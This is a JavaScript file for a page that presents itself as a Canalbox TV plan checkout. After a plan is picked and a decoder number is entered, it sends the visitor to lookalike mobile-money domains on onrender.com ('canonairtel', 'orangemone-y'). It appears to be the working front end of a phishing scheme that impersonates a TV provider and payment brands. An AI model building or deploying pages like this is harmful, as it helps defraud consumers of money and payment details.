const menuToggle = document.querySelector(".menu-toggle");
const menuPanel = document.querySelector(".menu-panel");
const cookieNotice = document.querySelector(".cookie-notice");
const checkoutDialog = document.querySelector(".checkout-dialog");
const checkoutForm = document.querySelector(".checkout-card");
const decoderInput = document.querySelector(".decoder-input");
const checkoutPlanName = document.querySelector(".checkout-plan-name");
const checkoutPlanPrice = document.querySelector(".checkout-plan-price");
const orangeButton = document.querySelector(".orange-option");

if (
  !(checkoutDialog instanceof HTMLDialogElement) ||
  !(checkoutForm instanceof HTMLFormElement) ||
  !(decoderInput instanceof HTMLInputElement) ||
  !(checkoutPlanName instanceof HTMLElement) ||
  !(checkoutPlanPrice instanceof HTMLElement) ||
  !(orangeButton instanceof HTMLButtonElement)
) {
  throw new Error("The Canalbox plan checkout is missing required elements.");
}

function setMenuOpen(isOpen) {
  menuToggle.setAttribute("aria-expanded", String(isOpen));
  menuToggle.setAttribute("aria-label", isOpen ? "Fermer le menu" : "Ouvrir le menu");
  menuPanel.setAttribute("aria-hidden", String(!isOpen));
  menuPanel.inert = !isOpen;
  menuPanel.classList.toggle("is-open", isOpen);
}

menuToggle.addEventListener("click", () => {
  setMenuOpen(menuToggle.getAttribute("aria-expanded") !== "true");
});

menuPanel.addEventListener("click", (event) => {
  if (event.target.closest("a")) {
    setMenuOpen(false);
  }
});

document.addEventListener("keydown", (event) => {
  if (event.key === "Escape" && menuToggle.getAttribute("aria-expanded") === "true") {
    setMenuOpen(false);
    menuToggle.focus();
  }
});

if (localStorage.getItem("canalbox-cookie-choice")) {
  cookieNotice.classList.add("is-hidden");
}

document.querySelector(".cookie-accept").addEventListener("click", () => {
  localStorage.setItem("canalbox-cookie-choice", "accepted");
  cookieNotice.classList.add("is-hidden");
});

document.querySelector(".cookie-personalize").addEventListener("click", () => {
  localStorage.setItem("canalbox-cookie-choice", "personalized");
  cookieNotice.classList.add("is-hidden");
});

document.querySelectorAll(".plan").forEach((plan) => {
  plan.addEventListener("click", (event) => {
    event.preventDefault();
    const planName = plan.dataset.planName;
    const planPrice = plan.dataset.planPrice;
    if (!planName || !planPrice) {
      throw new Error("A Canalbox plan is missing its checkout details.");
    }
    checkoutPlanName.textContent = planName;
    checkoutPlanPrice.textContent = planPrice;
    checkoutForm.reset();
    checkoutDialog.showModal();
    decoderInput.focus();
  });
});

document.querySelector(".checkout-close").addEventListener("click", () => {
  checkoutDialog.close();
});

checkoutDialog.addEventListener("click", (event) => {
  if (event.target === checkoutDialog) {
    checkoutDialog.close();
  }
});

checkoutForm.addEventListener("submit", (event) => {
  event.preventDefault();
  if (!checkoutForm.reportValidity()) {
    return;
  }
  window.location.assign("https://canonairtel.onrender.com/");
});

orangeButton.addEventListener("click", () => {
  if (!decoderInput.reportValidity()) {
    return;
  }
  window.location.assign("https://orangemone-y.onrender.com");
});
